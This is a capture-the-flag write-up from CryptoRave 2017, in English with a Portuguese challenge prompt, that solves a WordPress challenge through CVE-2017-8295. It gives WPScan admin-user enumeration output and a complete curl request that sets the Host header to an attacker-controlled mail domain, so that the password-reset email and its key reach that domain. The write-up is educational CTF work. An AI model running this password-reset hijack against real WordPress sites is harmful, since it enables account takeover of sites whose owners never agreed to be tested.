---
title: "CryptoRave 2017: web200-bugpress"
date: "2017-05-10T01:02:58.000Z"
lastmod: "2017-06-05T15:25:12.000Z"
tags: ["web security", "cryp70ch4052k17", "cryptorave 2017", "phpmailer", "wordpress", "0day", "ctf"]
slug: "cryp70ch405-2017-web200-bugpress"
url: "/cryp70ch405-2017-web200-bugpress/"
---
Você tem um blog Wordpress e uma sensação de falta de patch...   
Link: <http://34.202.17.29/>   
OBS: A flag está no formato CR2017{flag}

## Solution

TL;DR

[marcioRAGarcia](https://www.linkedin.com/in/marciorag/) hosted a mailserver w/ a catch-all mailbox and we exploited
[CVE-2017-8295](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295) vulnerability.

Fingerprinting w/ [WPScan](https://wpscan.org/)..

- WordPress version 4.7.4 (Released on 2017-04-20) identified from meta generator

![](/content/images/2017/05/Selection_879.png)

If the version is `<= 4.7.4`, this installation may be vulnerable to [CVE-2017-8295](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295)

> WordPress through 4.7.4 relies on the `Host HTTP header` for a password-reset e-mail message, which makes it easier for remote attackers to reset arbitrary passwords by making a crafted `wp-login.php?action=lostpassword` request and then arranging for this message to bounce or be resent, leading to transmission of the reset key to a mailbox on an attacker-controlled `SMTP server`.

This vuln is discovered by [Dawid Golunski](http://twitter.com/dawid_golunski) from [ExploitBox.io](http://exploitbox.io), more details and a well written PoC [here](https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html).

All we need to do:

- Enumerate the Wordpress admin username (wpscan can help..)
- Host a mail server w/ a `catch-all` mailbox `*@attackerdomain.com`
- Intercept the `POST /wp-login.php?action=lostpassword`, rewrite the `Host header` to our own mail server domain and replay this request.

The Wordpress will use `SERVER_NAME` variable to get the hostname of the server in order to create a `From/Return-Path` header of the outgoing password reset email.

If for some reason(mailbox out of quota or any delivery error) the server is unable to deliver the email into the admin mailbox it will return to `Return-Path`, our `mailbox@ourdomain.com`

Enumerating wordpress users..

```bash
wpscan -u http://34.202.17.29/ --enumerate u

[+] Identified the following 1 user/s:
    +----+------------+-----------------+
    | Id | Login      | Name            |
    +----+------------+-----------------+
    | 1  | ch405admin | ch405admin      |
    +----+------------+-----------------+
```

Nice, we have our admin username `ch405admin`

Now, [marcioRAGarcia](https://www.linkedin.com/in/marciorag/) used your own domain/mailserver to create the catch-all mailbox to receive the reset password mail and we rewrite/replay the `POST /wp-login.php?action=lostpassword`

```bash
curl -i -s -k  -X 'POST' \  
    -H 'Origin: http://34.202.17.29' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3020.89 Safari/537.32' 
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Referer: http://34.202.17.29/wp-login.php?action=lostpassword' \
    -H 'Host: marciogarcia.com.br' \
    -b 'wordpress_test_cookie=WP+Cookie+check' \
    --data-binary $'user_login=ch405admin&redirect_to=&wp-submit=Get+New+Password' \
    'http://34.202.17.29/wp-login.php?action=lostpassword'
```

![](/content/images/2017/05/Selection_883.png)

..and server sent us the flag inside the password reset mail!

Awesome contest [Criptorave / CRYP70 CH405 / RTFM](https://cryptorave.org/)

![](/content/images/2017/05/Selection_888.png)

### Local CTF

Congratz to **mtps3**([Matheus](https://www.linkedin.com/in/matheus-jesus/)), our local player for winning this contest!

![](/content/images/2017/05/Selection_882.png)

## References

- CVE-2017-8295 - <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295>
- WordPress Core <= 4.7.4 Potential Unauthorized Password Reset (0day) -
  <https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html>
